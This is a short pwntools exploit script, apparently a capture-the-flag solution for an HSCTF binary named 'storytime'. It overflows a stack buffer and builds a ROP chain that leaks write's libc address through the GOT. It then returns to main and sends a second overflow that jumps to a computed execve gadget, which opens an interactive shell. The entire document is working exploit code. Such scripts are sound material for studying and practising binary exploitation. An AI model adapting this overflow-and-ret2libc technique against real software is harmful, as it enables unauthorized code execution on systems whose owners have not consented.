from pwn import *

binary = context.binary = ELF("./storytime")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.23.so")

write_got = 0x601018
write_plt = 0x4004a0
main_addr = 0x40062e

# 0x1f72b0 (write) - 0x14526a (execve) = 0xb2046
offset = 0xb2046
# pop rdi; ret
pop_rdi = 0x400703
# pop rsi; pop r15; ret
pop_rsi = 0x400701

if args.GDB:
    p = gdb.debug([ld.path, binary.path], env={"LD_PRELOAD":libc.path})
else:
    p = process([ld.path, binary.path], env={"LD_PRELOAD":libc.path})

payload = b"A" * 0x38
payload += p64(pop_rdi)
payload += p64(1)
payload += p64(pop_rsi)
payload += p64(write_got)
payload += p64(0)
payload += p64(write_plt)
payload += p64(main_addr)
p.sendline(payload)

p.readuntil(b"HSCTF PWNNNNNNNNNNNNNNNNNNNN")
write_addr = p.readuntil(b"\x00\x00")
write_addr = write_addr.split(b"\nTell me a story: \n")[1]
write_addr = u64(write_addr)

exec_addr = write_addr - offset

payload = b"A" * 0x38
payload += p64(exec_addr)

p.sendline(payload)

p.interactive()